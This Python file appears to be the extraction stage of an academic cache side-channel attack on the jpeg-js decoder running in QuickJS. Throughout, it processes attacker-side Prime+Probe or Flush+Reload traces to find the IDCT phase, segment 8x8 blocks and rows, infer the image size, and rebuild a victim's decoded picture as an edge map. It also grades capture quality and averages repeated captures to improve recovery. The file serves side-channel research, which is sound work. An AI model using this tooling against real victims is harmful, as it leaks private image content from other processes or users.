"""
Extractor for the QuickJS jpeg-js IDCT cache attack (SCAR case study 2, 5.2).

Signal model
------------
jpeg-js `quantizeAndInverse` runs an 8x8 IDCT per block. A row or column whose
AC coefficients are all zero takes a short path, otherwise the full butterfly
runs, so per-block complex-path work is a block-resolution edge map (not pixel
intensities). The monitored handler lines are chosen by WHERE INSIDE A BLOCK
they fire (see quickjs_jpeg.c):

  slot0  mul       dense through the 64-iteration dequant loop (block START),
                   then ~16 more per complex pass
  slot1  sar       ~20 per complex pass, then dense through the 64-iteration
                   output loop (block END)
  slot2  row_mark  the 8 `new Uint8Array(...)` calls at the head of each ROW

The image size is NOT an input. It is recovered from the trace and is used
elsewhere only as ground truth to score the result (compare.py).

Reconstruction
--------------
1. Blocks. buildComponentData's 8x8 copy loop sits between two blocks and runs
   neither handler, so block boundaries are silences of the MERGED mul+sar
   stream. Neither channel works alone, because mul is also silent through the
   output loop and sar through the dequant loop, so each one splits a block in
   half.
2. Phase. Three regimes share one capture and the silence rate alone cannot
   separate them -- Huffman entropy decode is dense with ~1 silence per 1e6
   cycles, the IDCT is dense with ~18 (one per block), and after the victim
   exits the channels emit sparse isolated noise where nearly every gap counts
   as a silence. Requiring BOTH near-peak hit density and near-peak silence rate
   finds the IDCT.
3. Shape. The row marker fires a burst at every row start, so the number of
   rows H is the burst count whose per-row block counts come out most uniform,
   and the width is the block count over H. Across captures the modal H is
   voted so one misfired marker cannot set the shape.
4. Rows. A row boundary is the block silence that also holds the row marker's
   hits, so rows land on real block edges and no raster drift accumulates.
5. Value. Inside a block the order is dequant (mul only), butterflies (both),
   output loop (sar only). So sar hits BEFORE the block's last mul and mul hits
   AFTER its first sar are butterfly-only, dropping the ~64-event constant
   baseline the secret branch does not control. Their sum is `btf`, the default.

Per-capture SNR is low, so pass `-f` more than once to average several captures
of the same image. Eviction-set quality varies per launch AND per session and a
bad capture looks exactly like a regression, so gate captures with
`capture_health` (the `--health` CLI mode), as capture.sh does. This module is
deterministic and never raises on a weak trace.
"""
import argparse
from collections import Counter
from pathlib import Path
import numpy as np
from PIL import Image

import sys
sys.path.insert(0, str(Path(__file__).resolve().parent))
from utils import load_trace, lat_to_hit  # noqa: E402

# ---- tunables ---------------------------------------------------------------
GAP = 5000          # cyc of joint mul+sar silence that separates two blocks
PHASE_BINS = (2e5, 5e5, 1e6, 2e6, 5e6)
DENSE_FRAC = 0.40   # a bin is "in the victim" above this fraction of peak hits
CADENCE_FRAC = 0.45 # a dense bin is "in the IDCT" above this fraction of peak
ROW_WINDOW = 0.40   # row-cut search window, as a fraction of a row's blocks
ROW_WB_CAND = (2_000, 3_000, 4_000, 6_000, 8_000, 12_000)
ROW_MIN_CAND = (2, 3, 4, 5, 6, 8)
HEALTH_MIN_LO, HEALTH_MAX_HI = 0.75, 1.30   # blocks per row, min/max vs median
HEALTH_ASPECT_MAX = 20      # a degraded row marker recovers absurdly few rows
VALUES = ("btf", "sar_pre", "mul_post", "sar", "mul", "dur")


def hits(df, slot, at="PP"):
    col = df[slot]
    pos = col.apply(lambda x: lat_to_hit(x[1], at))
    return np.sort(col[pos].apply(lambda x: x[0]).astype(np.float64).values)


def silences(ev, gap=GAP):
    """(start, end) of every joint silence longer than `gap`."""
    i = np.where(np.diff(ev) > gap)[0]
    return ev[i], ev[i + 1]


def longest_run(mask):
    best_a = best_n = cur_a = cur_n = 0
    for i, v in enumerate(mask):
        if v:
            if cur_n == 0:
                cur_a = i
            cur_n += 1
            if cur_n > best_n:
                best_a, best_n = cur_a, cur_n
        else:
            cur_n = 0
    return best_a, best_n


def phase_at(merged, sil, binw):
    """Longest stretch that is both dense in hits and finely segmented."""
    edges = np.arange(0, merged[-1] + binw, binw)
    if len(edges) < 4:
        return None
    mh, _ = np.histogram(merged, bins=edges)
    sh, _ = np.histogram(sil, bins=edges)
    dense = mh >= DENSE_FRAC * np.percentile(mh, 95)
    if not dense.any():
        return None
    speak = np.percentile(sh[dense], 95)
    if speak < 4:
        return None
    a, n = longest_run(dense & (sh >= CADENCE_FRAC * speak))
    if n < 3:
        return None
    inside = sil[(sil >= edges[a]) & (sil <= edges[a + n])]
    if len(inside) < 8:
        return None
    return inside[0], inside[-1]


def idct_phase(merged, sil):
    """The IDCT is the longest stretch that is both dense and finely segmented."""
    if len(sil) < 8 or len(merged) < 1000:
        return None
    best = None
    for binw in PHASE_BINS:
        if merged[-1] / binw < 8:
            continue
        ph = phase_at(merged, sil, binw)
        if ph is not None:
            best = ph
    return best


def burst_starts(rm, wb, min_burst):
    """Start of each marker burst, a run of >=min_burst marks within wb cycles.
    Isolated marks are line-sharing noise."""
    if len(rm) == 0:
        return np.array([])
    cuts = np.where(np.diff(rm) > wb)[0]
    bounds = np.concatenate([[0], cuts + 1, [len(rm)]])
    sizes = np.diff(bounds)
    starts = rm[bounds[:-1]]
    return starts[sizes >= min_burst]


def infer_height(rm_win, centers, nblk):
    """Row count H from the marker. Keep the burst clustering whose per-row block
    counts come out most uniform. None when the marker is too degraded."""
    if rm_win is None or centers is None or len(rm_win) < 8 or nblk < 8:
        return None
    best = None
    for wb in ROW_WB_CAND:
        for mb in ROW_MIN_CAND:
            starts = burst_starts(rm_win, wb, mb)
            R = len(starts)
            if R < 4 or R > nblk // 2:
                continue
            ridx = np.clip(np.searchsorted(starts, centers, "right") - 1, 0, R - 1)
            counts = np.array([int((ridx == r).sum()) for r in range(R)])
            counts = counts[counts > 0]
            if len(counts) < 4 or np.median(counts) < 4:
                continue
            wcv = counts.std() / (counts.mean() + 1e-9)
            gg = np.diff(starts)
            scv = gg.std() / (gg.mean() + 1e-9)
            score = wcv + 0.5 * scv
            if best is None or score < best[0]:
                best = (score, len(counts))
    return best[1] if best else None


def choose_dims(nblk, rm_win, centers, verbose=True):
    """(W, H) in blocks. H from the marker, W = nblk / H, near-square when the
    marker is unusable."""
    H = infer_height(rm_win, centers, nblk)
    if H:
        W = max(1, int(round(nblk / H)))
        src = f"row marker H={H}"
    else:
        H = max(1, int(round(np.sqrt(nblk))))
        W = max(1, int(round(nblk / H)))
        src = "no row marker, near-square"
    if verbose:
        print(f"  shape recovered ({src}): {W}x{H} (WxH)")
    return W, H


def vote_dims(shapes):
    """Consensus (W, H) across traces. H is the modal row count, ties broken
    toward the median, and W the median width at that H."""
    ws = [w for w, _ in shapes]
    hs = [h for _, h in shapes]
    cnt = Counter(hs)
    top = max(cnt.values())
    med = np.median(hs)
    H = min((h for h, n in cnt.items() if n == top), key=lambda h: abs(h - med))
    wsel = [w for w, h in shapes if h == H] or ws
    return int(round(np.median(wsel))), H


def pick_rows(rmc, width, nblk, H):
    """The H-1 cuts that end each image row. The k-th sits near block k*nblk/H,
    and within a window there take the silence with the most marker hits. Each
    cut is anchored absolutely so the walk cannot drift."""
    est = nblk / H
    win = max(3, int(ROW_WINDOW * est))
    chosen, prev = [], -1
    for k in range(1, H):
        target = k * est - 1
        a = max(int(target - win), prev + 1)
        b = min(int(target + win), nblk - 2 - (H - 1 - k))
        if a > b:
            return None
        idx = np.arange(a, b + 1)
        prev = int(idx[np.lexsort((width[idx], rmc[idx]))[-1]])
        chosen.append(prev)
    return np.array(chosen)


def pick_rows_uniform(rmc, nblk, H, win_frac=0.30, mrew=5.0, dz=0.10):
    """Noisy-marker alternative to pick_rows. All H-1 cuts are chosen jointly by
    DP, marker support against a penalty on uneven row widths, so one bad burst
    cannot cascade. Salvages more traces at slightly lower accuracy. None on
    failure."""
    if H < 2 or nblk < 2 * H:
        return None
    est = nblk / H
    win = max(3, int(win_frac * est))
    mr = rmc / (rmc.max() + 1e-9) if len(rmc) and rmc.max() > 0 else np.zeros(len(rmc))
    levels = []
    for r in range(1, H):
        c = r * est
        a = max(1, int(c - win))
        b = min(nblk - 2, int(c + win))
        if a > b:
            return None
        levels.append(np.arange(a, b + 1))

    def rowcost(p, j):
        dev = max(0.0, abs((j - p) - est) / est - dz)
        return dev * dev - (mrew * mr[j + 1] if j + 1 < len(mr) else 0.0)

    prev = levels[0]
    dp = np.array([rowcost(-1, int(j)) for j in prev])
    bt = [[-1] * len(prev)]
    for r in range(1, H - 1):
        cur = levels[r]
        ndp = np.full(len(cur), np.inf)
        nbk = [-1] * len(cur)
        for cj, j in enumerate(cur):
            ok = prev < j
            if not ok.any():
                continue
            costs = dp[ok] + np.array([rowcost(int(p), int(j)) for p in prev[ok]])
            k = int(np.argmin(costs))
            ndp[cj] = costs[k]
            nbk[cj] = int(np.where(ok)[0][k])
        dp, prev, bt = ndp, cur, bt + [nbk]
    final = dp + np.array([((nblk - 1 - int(j) - est) / est) ** 2 for j in prev])
    ci = int(np.argmin(final))
    cuts = []
    for r in range(H - 2, -1, -1):
        cuts.append(int(levels[r][ci]))
        if r > 0:
            ci = bt[r][ci]
            if ci is None or ci < 0:
                return None
    return np.array(cuts[::-1])


def cut_rows(rmc, width, nblk, H, rows):
    """Row cuts by the requested strategy, strict marker-max or uniform DP."""
    if rows == "uniform":
        return pick_rows_uniform(rmc, nblk, H)
    return pick_rows(rmc, width, nblk, H)


def resample(v, w):
    """Resize one row's block-value vector to length w (linear interp)."""
    n = len(v)
    if n == 0:
        return np.zeros(w)
    if n == w:
        return v.astype(np.float64)
    return np.interp(np.linspace(0, 1, w), np.linspace(0, 1, n), v)


def resize2d(grid, W, H):
    """Resample a block map to W columns and H rows (linear, separable)."""
    g = np.vstack([resample(r, W) for r in grid])
    return np.column_stack([resample(g[:, c], H) for c in range(W)])


def block_map(filepath, at="PP", gap=GAP, value="btf", verbose=True,
              rows="strict"):
    """Recover the per-block value map of one trace. Returns (map, W, H)."""
    df = load_trace(filepath)
    if df.shape[1] < 3:
        print(f"expected 3 channels, got {df.shape[1]}")
        return None, 0, 0
    mul, sar, rm = (hits(df, i, at) for i in (0, 1, df.shape[1] - 1))
    if len(mul) < 1000 or len(sar) < 1000:
        print(f"too few hits (mul={len(mul)} sar={len(sar)}) to segment blocks")
        return None, 0, 0
    t0 = min(mul[0], sar[0], rm[0] if len(rm) else mul[0])
    mul, sar, rm = mul - t0, sar - t0, rm - t0
    merged = np.sort(np.concatenate([mul, sar]))

    slo, shi = silences(merged, gap)
    phase = idct_phase(merged, (slo + shi) / 2.0)
    if phase is None:
        print("could not locate the IDCT phase")
        return None, 0, 0
    A, B = phase
    mw = merged[(merged >= A) & (merged <= B)]
    lo, hi = silences(mw, gap)
    nblk = len(lo) + 1

    bounds = np.concatenate([[A], (lo + hi) / 2.0, [B]])
    centers = (bounds[:-1] + bounds[1:]) / 2.0
    rm_win = rm[(rm >= A) & (rm <= B)]
    rmc_all = np.searchsorted(rm, hi) - np.searchsorted(rm, lo)
    W, H = choose_dims(nblk, rm_win, centers, verbose)
    rowcut = cut_rows(rmc_all, hi - lo, nblk, H, rows)
    if rowcut is None:
        print(f"row segmentation failed ({nblk} blocks, {H} rows)")
        return None, 0, 0

    mi = np.searchsorted(mul, bounds)
    si = np.searchsorted(sar, bounds)
    if value in ("btf", "sar_pre", "mul_post"):
        sar_pre = np.zeros(nblk)
        mul_post = np.zeros(nblk)
        for i in range(nblk):
            ms, me, ss, se = mi[i], mi[i + 1], si[i], si[i + 1]
            if me > ms and se > ss:
                sar_pre[i] = np.searchsorted(sar[ss:se], mul[me - 1], "right")
                mul_post[i] = (me - ms) - np.searchsorted(mul[ms:me], sar[ss],
                                                          "left")
        v = {"btf": sar_pre + mul_post, "sar_pre": sar_pre,
             "mul_post": mul_post}[value]
    elif value == "sar":
        v = np.diff(si).astype(np.float64)
    elif value == "mul":
        v = np.diff(mi).astype(np.float64)
    else:
        v = np.diff(bounds)

    starts = np.concatenate([[0], rowcut + 1, [nblk]])
    grid = np.vstack([resample(v[starts[r]:starts[r + 1]], W) for r in range(H)])
    if verbose:
        cnt = np.diff(starts)
        print(f"{filepath}: IDCT [{A:.3e},{B:.3e}] blocks={nblk} -> {W}x{H} "
              f"(WxH) blocks/row min/med/max="
              f"{cnt.min()}/{int(np.median(cnt))}/{cnt.max()} value={value}")
    return grid, W, H


def extract_p_from_file(filepath, at="PP", image_path=None, scale=8,
                        value="btf", gap=GAP, invert=True, verbose=True,
                        rows="strict"):
    """Recover one or more traces of the same image into one picture. `filepath`
    is a path or a list. Each trace is decoded at its own shape, resampled onto
    the voted consensus shape, then z-scored and averaged."""
    paths = [filepath] if isinstance(filepath, (str, Path)) else list(filepath)
    decoded = []
    for p in paths:
        try:
            m, w, h = block_map(p, at, gap, value, verbose, rows)
        except Exception as e:
            print(f"skip {p}: {e}")
            continue
        if m is not None:
            decoded.append((m, w, h))
    if not decoded:
        return 0, 0, np.zeros((1, 1), np.uint8)
    W, H = vote_dims([(w, h) for _, w, h in decoded])
    if verbose and len(decoded) > 1:
        print(f"consensus shape {W}x{H} (WxH) from "
              f"{[f'{w}x{h}' for _, w, h in decoded]}")
    maps = []
    for m, w, h in decoded:
        if (w, h) != (W, H):
            m = resize2d(m, W, H)
        maps.append((m - m.mean()) / (m.std() + 1e-9))
    grid = np.mean(maps, axis=0)
    if verbose and len(maps) > 1:
        print(f"averaged {len(maps)} captures")

    lo, hi = np.percentile(grid, [5, 95])
    if hi <= lo:
        hi = lo + 1
    norm = np.clip((grid - lo) / (hi - lo), 0.0, 1.0)
    if invert:
        norm = 1.0 - norm
    img = np.round(norm * 255).astype(np.uint8)

    out = Path(image_path) if image_path else Path("jpeg-extraction.jpg")
    out.parent.mkdir(parents=True, exist_ok=True)
    rec = Image.fromarray(img, mode="L")
    if scale != 1:
        rec = rec.resize((W * scale, H * scale), Image.NEAREST)
    rec.save(out)
    if verbose:
        print(f"recovered ({rec.width}x{rec.height}) -> {out}")
    return H, W, img


def capture_health(filepath, at="PP", gap=GAP, rows="strict"):
    """Judge one trace from itself, no ground truth. A bad eviction set shows up
    as an uneven blocks-per-row count. Returns (ok, one-line report)."""
    df = load_trace(filepath)
    if df.shape[1] < 3:
        return False, f"FAIL {filepath}: {df.shape[1]} channels"
    mul, sar, rm = (hits(df, i, at) for i in (0, 1, df.shape[1] - 1))
    if len(mul) < 1000 or len(sar) < 1000:
        return False, f"FAIL {filepath}: mul={len(mul)} sar={len(sar)} too few hits"
    t0 = min(mul[0], sar[0], rm[0] if len(rm) else mul[0])
    mul, sar, rm = mul - t0, sar - t0, rm - t0
    merged = np.sort(np.concatenate([mul, sar]))
    slo, shi = silences(merged, gap)
    phase = idct_phase(merged, (slo + shi) / 2.0)
    if phase is None:
        return False, (f"FAIL {filepath}: no IDCT phase "
                       f"(mul={len(mul)} sar={len(sar)} rm={len(rm)})")
    A, B = phase
    mw = merged[(merged >= A) & (merged <= B)]
    lo, hi = silences(mw, gap)
    nblk = len(lo) + 1
    bounds = np.concatenate([[A], (lo + hi) / 2.0, [B]])
    centers = (bounds[:-1] + bounds[1:]) / 2.0
    rm_win = rm[(rm >= A) & (rm <= B)]
    rmc = np.searchsorted(rm, hi) - np.searchsorted(rm, lo)
    W, H = choose_dims(nblk, rm_win, centers, verbose=False)
    rowcut = cut_rows(rmc, hi - lo, nblk, H, rows)
    if rowcut is None:
        return False, f"FAIL {filepath}: row segmentation failed ({nblk} blocks)"
    cnt = np.diff(np.concatenate([[0], rowcut + 1, [nblk]]))
    med = max(np.median(cnt), 1)
    rlo, rhi = cnt.min() / med, cnt.max() / med
    aspect = max(W, H) / max(min(W, H), 1)
    why = []
    if aspect > HEALTH_ASPECT_MAX:
        why.append(f"aspect={aspect:.0f}")
    if rlo < HEALTH_MIN_LO:
        why.append(f"short_row={rlo:.2f}")
    if rhi > HEALTH_MAX_HI:
        why.append(f"long_row={rhi:.2f}")
    ok = not why
    msg = (f"{'PASS' if ok else 'FAIL'} {filepath}: mul={len(mul)} "
           f"sar={len(sar)} rm={len(rm)} phase={B - A:.3e} nblk={nblk} "
           f"{W}x{H} blocks/row={cnt.min()}/{int(med)}/{cnt.max()}"
           + (f"  [{', '.join(why)}]" if why else ""))
    return ok, msg


if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description="Extract an image from quickjs jpeg-js handler traces")
    ap.add_argument("--att", choices=["FR", "PS", "PP"], default="PP")
    ap.add_argument("--health", metavar="TRACE",
                    help="judge one trace's capture quality, print a report, "
                         "exit 0=PASS 1=FAIL, and do not extract")
    ap.add_argument("-f", "--file", action="append",
                    help="attacker trace r0.out, repeat to average captures")
    ap.add_argument("-o", "--image", default=None, help="output image path")
    ap.add_argument("--scale", type=int, default=8, help="upscale per 8x8 block")
    ap.add_argument("--value", choices=VALUES, default="btf",
                    help="per-block value (default btf: butterfly-only counts)")
    ap.add_argument("--gap", type=int, default=GAP,
                    help="cyc of mul+sar silence separating two blocks")
    ap.add_argument("--no-invert", action="store_true")
    ap.add_argument("--rows", choices=["strict", "uniform"], default="strict",
                    help="row segmentation: strict marker-max (default, most "
                         "accurate, keeps fewer traces) or uniform DP (salvages "
                         "noisy-marker traces at slightly lower accuracy)")
    args = ap.parse_args()
    if args.health:
        ok, report = capture_health(args.health, at=args.att, gap=args.gap,
                                    rows=args.rows)
        print(report)
        sys.exit(0 if ok else 1)
    if not args.file:
        ap.error("-f/--file is required unless --health is given")
    extract_p_from_file(args.file, at=args.att, image_path=args.image,
                        scale=args.scale, value=args.value, gap=args.gap,
                        invert=not args.no_invert, rows=args.rows)
